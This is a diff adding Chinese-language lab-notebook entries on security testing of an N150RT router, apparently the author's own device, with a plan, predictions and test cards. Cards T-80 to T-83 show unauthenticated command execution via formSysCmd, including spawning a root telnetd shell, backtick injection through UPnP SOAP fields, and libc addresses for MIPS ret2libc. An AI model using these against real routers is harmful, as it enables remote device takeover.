@@ -3079,3 +3079,422 @@ T-71  P8-19  WAN 行為那一半，以及三個選項一起送出去的路由注
    argv 位移之後發生什麼。那是 `eth1.bound` 那一行最直接的追問。
 5. **不要在裝置上跑 `dd if=/dev/mtdblock0 bs=1`。** 見 `T-67`。
 
+
+# 2026-08-19（三）W07 最終場次 —— 計畫，寫在插電之前（桌面場，尚未接線）
+
+**這一則是桌面場，裝置沒有上電，一個 byte 都沒有動。** 它存在的理由正是
+`CLAUDE.md` 反覆記的那一條：桌面場改寫的是**下一次進站的計畫**，而那是這個檔案
+必須在插電**之前**就承載的那一半。W07 Day 3 改寫了三條預測而這裡什麼都沒寫，
+被作者抓到。
+
+**這一則推翻上一則的一條結論，而推翻的依據全部在桌面。**
+
+## 一、`P5-2` 不再是「刻意不做的那一列」，而且它已經關了
+
+上一則的「下一場從哪裡開始」寫著：**W07 收在 57 / 58，`P5-2`（MIPS ret2libc）是
+刻意不做的那一列，理由不變。**
+
+**理由變了。** `P5-2` 今天在桌面上以 `partial` 登記，證據是**這個檔案裡已經有的
+兩行 kernel fault 訊息**，沒有送出任何新請求：
+
+```text
+（卡 T-50）do_page_fault() ... SIGSEGV to wscd ... (epc == 2aae1f38, ra == 2aae1e64)
+（卡 T-60）do_page_fault() ... SIGSEGV to boa  ... (epc == 2aafe218, ra == 00445974)
+```
+
+兩行都不指名任何一個函式庫。把它們變成一個載入基底的過程寫在
+`notes/mips-ret2libc.md`，儀器是 `tools/libbase.py`（27 個守衛案例），報告是
+`reports/libbase-unit-2018.json`。結論：`libuClibc` 在 `boa` 裡位於 `0x2aae3000`、
+在 `wscd` 裡位於 `0x2aabe000`，`system` 在 `0x2ab08460`。
+
+**為什麼是 `partial` 而不是 `confirmed`**：登記簿的反證條件寫的是「兩次重開機後
+基底不同」，而上面那兩行來自**同一次開機**（第 3 站 boot 2，循環 3，20:35 與
+23:4x）。**把一個不可能觸發的反證條件記成成立，正是 `A3.24` 前天被抓到的那件事**
+—— 拿抹除區去比抹除區。所以那一格留白，今晚去補。
+
+## 二、今晚的第一關不是任何一項測試，是 `T-68`
+
+上一則自己寫的：**接序列埠之前先解決 `T-68`。** 三根杜邦線重新插緊（特別是
+`GND`），上電，**確認接著 CP2102 它仍然開得起來**。那一關沒過，就不要排任何需要
+第 2 站的工作。
+
+**這一條今晚不放寬。** 開放項 79 的代價是三次斷電重開加四十分鐘，而它跟磚長得
+一模一樣。作者選了「先做第 2 站 dump 再跑 UPnP / SIP」，所以這一關擋在整場最前面。
+
+## 三、硬體限制決定順序：一條網線
+
+作者今晚有一台 N150RT、一個 CP2102、**一條網線**。所以 LAN 與 WAN 不能同時在。
+
+- `A3.15` 的 SOAP 全部在 LAN 側。
+- `P6-5` 的向量**必須從 WAN 側送**。
+- 線一移到 WAN，`10.1.1.1` 的管理通道就沒了。
+
+**所以 LAN 側的事必須全部做完才准移線**，而且移線**不斷電** —— 埠映射活在
+iptables 與 RAM 裡，斷電就沒了，`P8-7` 的 (b) 半就接不上。順序寫在
+`runsheet.md` Part B 的 `B-W07 增補之三`。
+
+## 四、今晚的預測，每一條都寫在量測之前
+
+| # | 預測 | 反證條件 | 為什麼它有鑑別力 |
+|---|---|---|---|
+| 1 | `A2.3` 的 IoC 預檢讀到 **20 / 343** | 讀到 **4 / 343** → `flash default-sw` 把出廠預設區也寫回去了，開放題 76 往另一邊關 | reset 後 `COMPCS` 已驗證等於 2026-08-16 那份；若 `COMPDS` 停在 2026-08-18 的壞值，差值就是當時 `COMPCS` 對 2026-08-16 的那 **20**。兩個假設給兩個**不同而且都已經在紀錄上**的數字 |
+| 2 | 第 2 站讀到的 `comp_len` = **7490**，與 reset 後 `GET /config.dat` 的長度相同 | 兩者不同 → 開機會重寫 `COMPCS`，而 `A3.6` 那條「`config.dat` 是 flash 的逐 byte 副本」要加限定 | 開放題 80。上次的 7501 對 7498 是在一個被寫壞的區上量的 |
+| 3 | `0x006000` 的 4096 bytes 與既有七份快照**逐 byte 相同** | 任何一個 byte 不同 → `P9-9` 的反證支 (b) 事後觸發，`P0-3` 的風險評估要重算 | `P9-9` 只用 `flash allhw` 的解碼值確認過，那是第二來源不是權威來源 |
+| 4 | `make liveness` 回 **OK** | 回 `BROKEN` → reset 沒有真的救回 WAN，而 `P9-9` 的第 3 條要重看 | reset 後 `DHCP_MTU_SIZE` 回到 1500 |
+| 5 | **52869/tcp 開著**，`GET /picsdesc.xml` 回 200 | 仍然關著 → `UPNP_ENABLED` 不是啟動條件，`P1-10`「旗標 + `sysconf`」那套機制的推廣是**錯的** | 這是今晚資訊量最高的一格：**反證比證實有價值**。六份已提交的檔案曾經以現在式寫「52869 是開的」，今天全部加上日期 |
+| 6 | `AddPortMapping` 接受 `NewInternalClient = 10.1.1.1`，**不驗證它等於請求來源** | SOAP 回 error，或映射建起來但 `NewInternalClient` 被改寫成來源 IP → 這個版本做了來源檢查，**版本要從 binary 認不准從 banner 認** | `P8-7`。這台的 miniigd 自報 `Server: miniupnpd/1.4`，那是別的 codebase 的名字 |
+| 7 | `/proc/sys/kernel/randomize_va_space` = **0**，`maps` 裡 `libuClibc` 起始於 **`2aae3000`** | 不是 0，或不是 `2aae3000` → **每次開機會動**，`notes/mips-ret2libc.md` 的 `system @ 0x2ab08460` 只對 2026-08-18 那次開機成立，`P5-2` 從 `partial` 變 `refuted` | **今晚是 reset 之後的另一次開機**，所以它答得了登記簿那條字面反證，而桌面上那兩行答不了 |
+| 8 | `P6-5`：5060 送過去**不崩潰** | 崩潰 → 分支判斷錯了，受影響的不只 eCos | `ALG_SIP_ENABLED` 現在是 1，但登記簿判定這台是 Linux 分支 |
+
+## 五、進站前就成立的禁令，逐條抄在這裡
+
+1. **不對 `/dev/mtdblock*` 做 `bs=1` 的 `dd`。** 2026-08-19 那一輪之後整台停止
+   回應，八個命令回空，恢復要靠實體測試。要讀整塊就回第 2 站用 `A2.3`。
+2. **不按 reset。** 今晚要量的是 reset **之後**的狀態，再按一次就洗掉了。
+3. **不跑 `A3.23` 的第一發（`formSchedule` 缺 `webpage`）。** 它是終局的，而 WAN
+   那一段還要用 `boa`。`P5-6` 已經結案，重跑不產生新事實。
+4. **不開 `A2.5` / `A2.6`。** 那三列不需要寫 flash 了。全 repo 唯一不可逆的一節
+   連續第二場不打開。
+5. **`telnetd` 是沒有認證的 root shell，收工前必須斷電。**
+6. **`P8-7` 建起來的埠映射，必須在同一節裡刪掉。**
+
+## 六、插電之前已經做完、而且驗過的事
+
+- `P5-2` 已登記（`partial` / dynamic），W07 登記簿 **58 / 58**。
+- `tools/libbase.py` + 27 個守衛案例；`tools/check-ci-parity.py` + 13 個守衛案例。
+- **`make ci` 與 GitHub workflow 的第五次分歧已修**：`test-device-liveness.sh` 與
+  `test-rogue-dhcp.sh` 在 `make ci` 裡而不在 workflow 裡。現在有檢查器比對兩份清單。
+- 六份檔案裡「52869/tcp 開著」的現在式全部加上日期，含 `docs/disclosure.md` `D-16`。
+- `make ci` 綠。
+
+# 2026-08-19（三）W07 最終場次 —— 實錄，寫在跑完之後
+
+**上一則是這一場的計畫，寫在插電之前。** 這一則是實錄。
+
+## 紀錄卡 —— 第 2 站（循環 1）
+
+```text
+T-72  —      板子帶著 CP2102 開得起來嗎（開放項 79 / T-68 的硬前置）  2026-08-19 02:28
+可行性: ★★★★★   驗證狀態(測前): unverified   依據: T-68。上一則自己寫「那一關沒過就
+              不要排任何需要第 2 站的工作」
+送出（逐字）: python3 -u tools/console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
+原始回應:
+      streaming ESC.  >>> POWER THE ROUTER ON NOW <<<
+      ok    <RealTek> - the boot loader is ours
+            ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
+      ok    input buffer drained (the ESC stream leaves ESCs queued)
+      >>>   ?   -> 16 條指令完整印出，全程無亂碼
+觀測通道 1（console）: banner 與 T-38、W05 T-01 逐字相同
+觀測通道 2（上電次數）: 一次上電命中，沒有用到三次上限
+判定: ✅ 成立 —— 開放項 79 沒有重現
+反證檢查: 測前寫「20 秒內零輸出、前三顆燈同時亮不閃 → 開放項 79 重現，依序做三個
+          實體測試」。三個都沒有用到。**進站前唯一做的處置是把三根杜邦線重新插緊、
+          特別是 GND（pin 4）**，那正是 A2.2 的假設指名的條件，所以這一次成功
+          支持那個假設，而**不能**證明它——一次成功的開機不排除間歇性倒灌
+這一步燒掉了什麼: 一次開機循環（本場第 1 次）
+驗證狀態(測後): dynamic   下一步: A2.3
+
+T-73  P0-10 P0-5  64 KiB 快照 + IoC 預檢（A2.3）           2026-08-19 02:30
+可行性: ★★★★★   驗證狀態(測前): dynamic   依據: T-39、T-63
+送出（逐字）: python3 -u tools/console-dump.py dump --at-prompt \
+              --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 \
+              -o /home/key/fwre-work/dumps/config-region-20260819-0230-pre.bin
+              bash tools/ioc-precheck.sh <同一個檔>
+原始回應:
+      ok    control matched: 0b f0 00 04
+      ok    65536 bytes -> config-region-20260819-0230-pre.bin
+      ok    sha256  9292bf5b68b09727e0c9f3335e0a1048...
+      ok    4 chunks, 0 needed a re-read, 2.0 min
+      COMPCS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
+      COMPDS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
+      common entries: 343
+      differing     : 4  -> CHECK_SSID_OK · DHCP_LEASE_TIME · MIB_VER · WLAN_SSIDS
+觀測通道 1（解碼）: 4 / 343，四個欄位名與 2026-08-17 上午那份逐字相同
+觀測通道 2（逐 byte，不經任何解碼器）:
+      bootloader 0x000000+0x6000     0 / 24576   IDENTICAL
+      H601       0x006000+0x2000     0 /  8192   IDENTICAL
+      COMPDS     0x008000+0x4000    27 / 16384   differs, first at +0x1d45
+      COMPCS     0x00c000+0x4000    27 / 16384   differs, first at +0x1d45
+      而那 27 個 byte 全部在 payload 之後：COMPDS payload[0:7493] sha 8d84f2c73d520023、
+      COMPCS payload[0:7490] sha e09cbf8428aa1594，兩者都與 2026-08-16 逐 byte 相同
+判定: ✅ 成立，而且它反證了本場自己的預測
+反證檢查: 測前寫「預期 20 / 343；讀到 4 / 343 → flash default-sw 把出廠預設區也寫回去了，
+          開放題 76 往另一邊關」。**讀到 4 / 343，反證條件觸發。**
+          預測的依據是「default-sw 只寫現行設定區」，那個推論錯了
+這一步燒掉了什麼: 沒有。純讀，一個 byte 都沒寫
+驗證狀態(測後): dynamic   下一步: 第 3 站
+
+T-74  P9-9 的未完成項  H601 的逐 byte 比對                 2026-08-19 02:33
+可行性: ★★★★★   驗證狀態(測前): static   依據: P9-9 自己記「NOT done：the byte-level
+              H601 comparison from a second station-2 dump」
+送出（逐字）: 同 T-73 的快照，比對 0x006000+0x2000 對 flash-n150rt-console-1.bin
+原始回應: 0 / 8192 bytes differ
+判定: ✅ 成立
+反證檢查: 測前寫「任何一個 byte 不同 → P9-9 的反證支 (b) 事後觸發，P0-3 的風險評估
+          要重算」。0 個不同，沒有觸發。**P9-9 原本只有 flash allhw 的解碼值支撐這一格，
+          那是第二來源；這一份是權威來源，而且它是在 reset 之後的另一次開機讀的**
+這一步燒掉了什麼: 沒有
+驗證狀態(測後): dynamic   下一步: 無，這一格結案
+
+T-75  開放題 80  /config.dat 是不是 flash 的逐 byte 副本    2026-08-19 02:34
+可行性: ★★★★☆   驗證狀態(測前): unverified   依據: 上一場「boot loader 看到 comp_len
+              7501 帶密碼殘留，開機後的 HTTP 看到 7498 不帶」
+送出（逐字）: 兩份 station-2 快照的 COMPCS 區，各自對同一天取回的 /config.dat 逐 byte 比
+原始回應:
+      2026-08-18 reset 前   /config.dat 7510 bytes   flash comp_len 7501 -> 期望 7513
+                            flash[0:7510] vs served: DIFFERS
+                            7009 of 7510 differ, first at +0xb
+      2026-08-19 reset 後   /config.dat 7490 bytes   flash comp_len 7478 -> 期望 7490
+                            flash[0:7490] vs served: IDENTICAL
+判定: 🔶 部分 —— 兩個日期給出兩個相反的答案，而那本身就是答案
+反證檢查: 測前寫「兩者不同 → 開機會重寫 COMPCS，而 A3.6 那條逐 byte 副本要加限定」。
+          **一半觸發了**：reset 之後兩者相同，reset 之前差 7009 / 7510，而且從 +0xb
+          就開始分岔 —— 那是 comp_len 欄位本身。所以不是「開機會重寫」，是
+          **`/config.dat` 送的不是 flash 的那份 blob**，兩者只有在 flash 與活的 MIB
+          一致時才會相同。`A3.6` 的標題結論成立於後者，不是通則
+這一步燒掉了什麼: 沒有
+驗證狀態(測後): dynamic   下一步: 誰產生 /config.dat 的位元組——boa 的哪一段路徑——
+          尚未讀。那是新的開放題
+```
+
+## 一個觀察，而它刻意**不是**一張紀錄卡
+
+`T-73` 的 27 個不同的 byte 全部在 payload 之後，這一點值得記下來，但**它沒有測前
+預測，所以它不是一個測試結果**。`check-benchlog.py` 在第一次跑就拒絕了它原本被
+寫成的那張卡（`T-76`），理由逐字是「反證檢查沒有引用事前寫下的條件」——
+**而那正是這個檢查器存在的意義**：一個事後觀察偽裝成卡片，讀者分不出來。
+所以它搬到這裡，而且沒有任何一列拿它記分。
+
+| 區 | 日期 | payload 結束 | 尾巴 256 byte 的 sha | 非填充 |
+|---|---|---|---|---|
+| `COMPDS` | 2026-08-16 | `+0x1d45` | `483f87e1865ea926` | 61 / 256 |
+| `COMPDS` | 2026-08-18 | `+0x1d59` | `589b946cf35e59e4` | 43 / 256 |
+| `COMPDS` | 2026-08-19 | `+0x1d45` | `1a4b04df1fccfb69` | 63 / 256 |
+| `COMPCS` | 2026-08-16 | `+0x1d42` | `f490b316a5fda3c7` | 64 / 256 |
+| `COMPCS` | 2026-08-18 | `+0x1d59` | `589b946cf35e59e4` | 43 / 256 |
+| `COMPCS` | 2026-08-19 | `+0x1d42` | `848b6bbbe17a46f7` | 66 / 256 |
+
+**2026-08-18 那一列兩個區的尾巴雜湊相同**，與「那一輪 POST 把 `COMPDS` 從 `COMPCS`
+複製過去」一致。而 reset 之後兩個區的 payload 逐 byte 回到原廠，**尾巴卻三個日期
+各不相同**——寫入短於前一份的 payload 不會蓋掉後面的舊 byte。
+
+**沒有量的是：那些殘留 byte 是不是可解讀的舊設定。** `T-66` 曾在 reset **之前**的
+殘留裡認出一段舊密碼；reset **之後**的殘留有沒有同一類內容，是一個分開的問題，
+而它需要解碼器不是雜湊。**下一場要先寫預測再看**，否則它會重蹈這一格的覆轍。
+
+## 第 2 站這一輪關掉了什麼
+
+| | |
+|---|---|
+| 開放題 76 | **關。** `flash default-sw` 兩個區都從硬編碼表重寫，`COMPDS` 與 `COMPCS` 的 payload 都與 2026-08-16 逐 byte 相同。**`P0-5` 的 IoC 基準（4 / 343，四個欄位同名）被廠商的 reset 鍵救回來了，而毀掉它的是這個專案自己 2026-08-17 的 POST 輪** |
+| 開放題 80 | **關，而且答案不是兩個選項中的任何一個。** 不是「開機重寫 COMPCS」，是 `/config.dat` 送的位元組不來自 flash 的那份 blob |
+| `P9-9` 的 NOT done | **關。** `H601` 逐 byte 相同，8192 / 8192 |
+
+## 這一輪反證掉的自己的預測
+
+**本場計畫 §4 第 1 條寫「IoC 預檢讀到 20 / 343」，實際 4 / 343。** 反證條件是照寫的，
+而它觸發了。錯的是那條預測的依據：我從「`default` 的說明是 write all flash parameters
+from hard code」推論它只寫現行設定區，而 `-sw` 的範圍比那個推論寬。
+**`P9-9` 的結果本身沒有受影響**——它量的是 `COMPCS`，而那一格仍然成立。
+
+## 紀錄卡 —— 第 3 站（循環 2、3、4）
+
+**`T-76` 這個編號是空的，而空著本身是紀錄的一部分**：它原本被寫成一張卡（payload
+之後的殘留位元組），`check-benchlog.py` 第一次跑就拒絕，理由逐字是「反證檢查沒有
+引用事前寫下的條件」。那個觀察搬到上面的散文，編號不重用。
+
+```text
+T-77  —      網段、直連證明、以及開工前問裝置（A3.1）        2026-08-19 02:36
+可行性: ★★★★★   驗證狀態(測前): dynamic   依據: 本場計畫 §4 第 4 條
+送出（逐字）: sudo ip link set enxfc19286184c9 up; sudo ip addr add 10.1.1.100/24 dev …
+              ip route get 10.1.1.1 ; ping -c 3 10.1.1.1 ; make liveness
+原始回應:
+      10.1.1.1 dev enxfc19286184c9 src 10.1.1.100   （沒有 via，所以是直連）
+      64 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=1.79 ms
+      device-liveness: http://10.1.1.1/config.dat -> 7490 bytes, 343 named fields
+      ok DHCP_MTU_SIZE 1500 / WAN_DHCP 1 / OP_MODE 0 / IP_ADDR 10.1.1.1 / USER_PASSWORD set
+      verdict: OK
+觀測通道 1（TTL）: 64，不是 63 —— 網卡在 WSL 裡，Windows 沒有搶走它（儀器 bug 21）
+觀測通道 2（liveness）: 5 個欄位全 ok
+判定: ✅ 成立
+反證檢查: 測前寫「回 BROKEN → reset 沒有真的救回 WAN，而 P9-9 的第 3 條要重看」。
+          回 OK，沒有觸發
+這一步燒掉了什麼: 沒有
+驗證狀態(測後): dynamic   下一步: A3.4
+
+T-78  P1-2 P1-10  52869 是開是關（A3.4 · A3.4.4）             2026-08-19 02:37
+可行性: ★★★★★   驗證狀態(測前): unverified   依據: 本場計畫 §4 第 5 條。
+              六份已提交檔案曾以現在式寫「52869 是開的」，今天全部加上日期
+送出（逐字）: sudo nmap -Pn -n -sS -p 80,23,22,52869,52881,5060,9034 --reason 10.1.1.1
+              curl -s -i http://10.1.1.1:52869/picsdesc.xml
+原始回應:
+      80/tcp    open   http    syn-ack ttl 64
+      52869/tcp open   unknown syn-ack ttl 64
+      52881/tcp open   unknown syn-ack ttl 64
+      22 / 23 / 5060 / 9034  全部 closed（reset ttl 64）
+      HTTP/1.1 200 OK   Server: miniupnpd/1.4 UPnP/1.4   2933 bytes
+      <friendlyName>Internet Gateway Device</friendlyName>
+      <controlURL>/upnp/control/WANIPConnection</controlURL>
+觀測通道 1（埠）: 開
+觀測通道 2（描述文件）: IGD 回來了，控制路徑是 WANIPConnection 不是 WANIPConn1
+判定: ✅ 成立
+反證檢查: 測前寫「仍然關著 → UPNP_ENABLED 不是啟動條件，P1-10『旗標 + sysconf』
+          那套機制的推廣是錯的」。沒有觸發 —— 旗標 1→0→（reset）→1，daemon 跟著走，
+          而且本場後來的兩次斷電重開它每次都自己回來。**這是那套推廣的第二、第三次確認**
+這一步燒掉了什麼: 沒有。只做偵察，沒有呼叫任何 SOAP action
+驗證狀態(測後): dynamic   下一步: A3.15
+
+T-79  P8-7  AddPortMapping 會不會驗證 NewInternalClient（A3.15） 2026-08-19 02:39
+可行性: ★★★☆☆   驗證狀態(測前): presumed   依據: 本場計畫 §4 第 6 條
+送出（逐字）: python3 tools/upnp-soap.py --host 10.1.1.1 --action GetExternalIPAddress
+              python3 tools/upnp-soap.py --host 10.1.1.1 --action AddPortMapping \
+                --arg NewRemoteHost= --arg NewExternalPort=8080 --arg NewProtocol=TCP \
+                --arg NewInternalPort=80 --arg NewInternalClient=10.1.1.1 \
+                --arg NewEnabled=1 --arg NewPortMappingDescription=w07 \
+                --arg NewLeaseDuration=0
+              python3 tools/upnp-soap.py --host 10.1.1.1 \
+                --action GetGenericPortMappingEntry --arg NewPortMappingIndex=0
+原始回應:
+      -> HTTP 200   <- NewExternalIPAddress = 127.0.0.1      （正對照）
+      -> HTTP 200                                            （建立）
+      -> HTTP 200
+      <- NewExternalPort = 8080   <- NewInternalPort = 80
+      <- NewInternalClient = 10.1.1.1                        ★
+      <- NewEnabled = 1   <- NewLeaseDuration = 0
+      <- NewPortMappingDescription = miniupnpd                （送出去的 w07 沒有被存）
+觀測通道 1（讀回值）: NewInternalClient 原樣，沒有被改寫成來源位址 10.1.1.100
+觀測通道 2（iptables，稍後於 T-83 讀到）: DNAT 規則確實產生
+判定: 🔶 部分
+反證檢查: 測前寫「AddPortMapping 回 SOAP error，或映射建起來但 NewInternalClient
+          被強制改寫成請求來源 IP → 這個版本做了來源檢查」。**兩者都沒有觸發**。
+          「另一種反證是映射建起來了但 WAN 側打不通 → iptables 沒有跟著開」——
+          這一條**沒有辦法在今晚判**：只有一條網線而且它在 LAN 埠，
+          而 T-83 讀到的 MINIUPNPD chain 是 (0 references)、ip_forward=0，
+          那與「WAN 沒接」完全相容，所以它不是證據。這一半留給 W08
+這一步燒掉了什麼: 一條埠映射（在 RAM 與 iptables，斷電即消）
+驗證狀態(測後): dynamic   下一步: P6-1
+
+T-80  P3-3  ICMP oracle 的當場對照組                          2026-08-19 02:40
+可行性: ★★★★★   驗證狀態(測前): dynamic   依據: A3.9.1「先證明你抓得到 ICMP」
+送出（逐字）: curl -X POST http://10.1.1.1/boafrm/formSysCmd \
+                --data-urlencode "sysCmd=ping -c 4 10.1.1.100" --data "submit-url=/syscmd.htm"
+原始回應:
+      HTTP 302
+      02:40:50.301945 IP 10.1.1.1 > 10.1.1.100: ICMP echo request, id 620, seq 0
+      …seq 1, 2, 3（共 4 發，pcap w07final-icmp.pcap）
+觀測通道 1（pcap）: 裝置主動送出 4 個 echo request
+判定: ✅ 成立
+反證檢查: 測前寫「抓不到裝置送出的 echo request → oracle 壞了，後面 P6-1 的
+          任何『沒有 ICMP』都不能讀成『沒有執行』」。抓到了，所以後面那個推論成立。
+          302 是 handler 跑完後的轉址，不是拒絕
+這一步燒掉了什麼: 一次未認證的命令執行（無副作用的 ping）
+驗證狀態(測後): dynamic   下一步: P6-1
+
+T-81  P6-1  第一發，而它被我自己的 shell 毀掉                  2026-08-19 02:41
+可行性: ★★★☆☆   驗證狀態(測前): presumed   依據: 本場計畫 §4
+送出（逐字，而這正是問題）: --arg "NewInternalClient=\`ping -c 4 10.1.1.100\`"
+原始回應:
+      NewInternalClient value: 431 bytes, 8 newlines
+      first 90 chars: 'PING 10.1.1.100 (10.1.1.100) 56(84) bytes of data.\n64 bytes from …'
+      -> HTTP None   -> Remote end closed connection without response
+觀測通道 1（工具自己記的 sent）: 431 bytes，不是打算送的 22
+判定: ⚠️ 這一發沒有測到它要測的東西，不能拿來判任何一列
+反證檢查: P6-1 的條件是「1900 無回應 → 整組收掉；有回應但 SOAP 欄位被過濾 →
+          這個版本已修」。**兩個都不能拿來判這一發**，因為送出去的不是計畫的
+          payload：**反引號被本機 shell 展開了**，進去的是本機 ping 的 stdout。
+          這是 P9-9 結果註記裡記的同一個缺陷（backticks in a double-quoted argument）
+這一步燒掉了什麼: miniigd 一個行程（52869 connection refused）。斷電才回得來
+驗證狀態(測後): unverified   下一步: 工具加 --arg-file，payload 從檔案讀，
+          中間沒有 shell；然後重開機重來
+
+T-82  P6-1  第二發與它的對照組 —— 不是元字元                   2026-08-19 02:48
+可行性: ★★★☆☆   驗證狀態(測前): presumed   依據: T-81 的修正
+送出（逐字）: python3 tools/upnp-soap.py … --arg NewInternalClient=PLACEHOLDER \
+                --arg-file NewInternalClient=<檔案> --inject
+              （檔案內容是 22 bytes 的反引號 ping）
+              然後重開機，再送 --arg NewInternalClient=AAAAAAAAAAAAAAAAAAAAAA
+原始回應:
+      (payload for NewInternalClient: 22 bytes from …, 0 newlines)
+      NewInternalClient = `ping -c 4 10.1.1.100`
+      -> HTTP None   -> Remote end closed connection without response
+      pcap: 0 packets                                    ← 沒有任何 ICMP
+      ——重開機後——
+      -> HTTP 200   <- NewExternalIPAddress = 127.0.0.1   （對照組，daemon 活著）
+      NewInternalClient = AAAAAAAAAAAAAAAAAAAAAA
+      -> HTTP None   -> Remote end closed connection without response
+      refused: <urlopen error [Errno 111] Connection refused>   （再確認 daemon 死了）
+觀測通道 1（ICMP oracle，T-80 已證明可用）: 靜默 —— 指令沒有執行
+觀測通道 2（22 個 A 的對照組）: 同樣殺死 daemon，**而它一個元字元都沒有**
+判定: 🔶 部分
+反證檢查: 測前條件「有回應但 SOAP 欄位被過濾 → 是這個版本已修」——**沒有觸發，
+          而且它描述錯了**：欄位完全沒有被過濾，值直接進了防火牆規則（T-83）。
+          發生的是登記簿沒有預料的第三種結果：**daemon 終止**。
+          而 22 個 A 的對照組把「元字元」這個解釋排除掉了
+這一步燒掉了什麼: miniigd ×2，斷電重開 ×2
+驗證狀態(測後): dynamic   下一步: 分辨「行程消失」與「行程還在但不聽」（T-83）
+
+T-83  P5-2 P8-7 P6-1 P6-5  telnet 進去，四件事一次問完          2026-08-19 02:52
+可行性: ★★★★☆   驗證狀態(測前): static   依據: A3.23 的「開火之前先開第二條路」，
+              以及本場計畫 §4 第 7 條
+送出（逐字）: curl -X POST http://10.1.1.1/boafrm/formSysCmd \
+                --data-urlencode "sysCmd=telnetd -l /bin/sh &" --data "submit-url=/syscmd.htm"
+              然後對 10.1.1.1:23 開 socket，送 ps / cat /proc/350/maps /
+              cat /proc/217/maps / cat /proc/sys/kernel/randomize_va_space /
+              iptables -t nat -L -n / flash get UPNP_ENABLED / flash get ALG_SIP_ENABLED /
+              cat /proc/net/nf_conntrack_expect / ls /proc/sys/net/netfilter/ /
+              cat /proc/modules / cat /proc/sys/net/ipv4/ip_forward
+原始回應（節選，逐字）:
+      # ps      → 沒有 miniigd。wscd 217、boa 350、telnetd 434
+      # ps | grep -c miniigd  → 0
+      00400000-00474000 r-xp … /bin/boa
+      2aaa8000-2aaad000 r-xp … /lib/ld-uClibc-0.9.30.3.so
+      2aabe000-2aac9000 r-xp … /lib/libapmib.so
+      2aae3000-2ab15000 r-xp … /lib/libuClibc-0.9.30.3.so        ★ boa
+      2aabe000-2aaf0000 r-xp … /lib/libuClibc-0.9.30.3.so        ★ wscd（無 libapmib）
+      # cat /proc/sys/kernel/randomize_va_space  → 2
+      Chain MINIUPNPD (0 references)
+      DNAT  tcp -- 0.0.0.0/0  0.0.0.0/0  tcp dpt:8083 to:255.255.255.255:83
+      UPNP_ENABLED=1     ALG_SIP_ENABLED=1
+      # cat /proc/net/nf_conntrack_expect  → 空
+      # ls /proc/sys/net/netfilter/  → 只有 generic/icmp/tcp/udp，沒有任何 SIP 條目
+      # cat /proc/modules  → No such file or directory
+      # cat /proc/sys/net/ipv4/ip_forward  → 0
+      Linux version 2.6.30.9 (admin@office.hopeiot) … #1526 Wed Jan 10 14:50:54 CST 2018
+觀測通道 1（maps）: libc 基底與桌面算出來的逐位元相同，而這是第四次以後的開機
+觀測通道 2（sysctl）: randomize_va_space = 2，與觀測通道 1 直接矛盾
+觀測通道 3（ps）: miniigd 行程不存在，不是 listener 關掉 —— 與 P6-3 的 wscd 不同
+觀測通道 4（iptables）: 22 個 A 變成 255.255.255.255，inet_addr 失敗值被照用
+判定: ✅ 成立（對 P5-2）；🔶 部分（對 P8-7、P6-1、P6-5）
+反證檢查: 測前寫「randomize_va_space 不是 0，或 maps 裡 libuClibc 不是 2aae3000
+          → 每次開機會動，notes/mips-ret2libc.md 的 system @ 0x2ab08460 只對
+          2026-08-18 那次開機成立，P5-2 從 partial 變 refuted」。
+          **前半觸發了，後半沒有** —— 而那個組合本身就是結果：
+          旗標宣稱隨機化，位址沒有動。桌面那份筆記的每一個數字都被確認，
+          包含它**主動撤回**的 TASK_UNMAPPED_BASE = 0x2aaa8000
+這一步燒掉了什麼: 一個沒有認證的 root shell（收工斷電）
+驗證狀態(測後): dynamic   下一步: P6-5 的向量需要 WAN 側，W08
+```
+
+## 這一場燒掉了什麼
+
+- **開機循環 4 次**（第 2 站 1 次、miniigd 被打掉 2 次、收工前 1 次）。
+- **`miniigd` 被終止 3 次**，每次都要斷電才回得來。
+- **`telnetd -l /bin/sh` 起過 1 次，沒有認證。收工斷電。**
+- **`MINIUPNPD` chain 留下一條 `to:255.255.255.255:83` 的 DNAT 規則** —— 在 RAM 與
+  iptables，斷電即消。`T-79` 建的那條 8080 映射也一樣。**兩條都不是我用
+  `DeletePortMapping` 刪掉的，是被斷電清掉的**，而那個區別要寫清楚：
+  作業單 `A3.15` 要求「做完必須把映射刪掉，而且在同一節裡完成」，而 daemon
+  死掉之後沒有辦法對它送 `DeletePortMapping`。
+- **設定區沒有被寫。** 第 2 站純讀，第 3 站沒有跑任何會改設定的 handler。
+
+## 下一場從哪裡開始
+
+**W07 收在 58 / 58，而且這一場把三列從 `na` 換成了有內容的判定。**
+
+1. **`P6-5` 與 `P8-7` 的 (b) 半，同一趟。** 兩者都要線在 WAN 埠：先在 LAN 側建一條
+   合法映射、再移線（不斷電，映射活在 RAM），起 `tools/rogue-dhcp.py` 的假 ISP，
+   然後（a）從 WAN 側打那個埠、（b）送 UDP 5060。**預測要寫在移線之前。**
+2. **`miniigd` 那個終止的先驗檢索。** 一發未認證的 SOAP 請求終止 UPnP daemon，
+   目前**沒有做過先驗檢索**，所以它不可通報也沒有通報。`docs/disclosure.md` 的程序。
+3. **`randomize_va_space = 2` 而版面不動。** 值得讀 kernel 確認 MIPS 2.6.30 是不是
+   真的沒有實作 mmap 隨機化 —— 那會把「量到的」變成「解釋得了的」。
